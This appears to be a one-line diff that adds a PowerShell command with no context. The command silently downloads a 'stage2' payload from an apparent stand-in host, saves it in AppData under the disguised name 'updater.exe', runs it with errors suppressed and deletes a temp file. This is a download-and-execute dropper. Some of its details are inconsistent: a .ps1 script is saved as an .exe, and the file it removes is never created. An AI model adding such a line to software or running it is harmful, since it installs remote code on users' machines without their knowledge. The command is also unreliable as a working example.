@@ -1,0 +1,1 @@
+curl.exe -s -L -o "$env:APPDATA\updater.exe" 'http://adatum.com:80/stage2.ps1'; Start-Process -FilePath "$env:APPDATA\updater.exe" -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
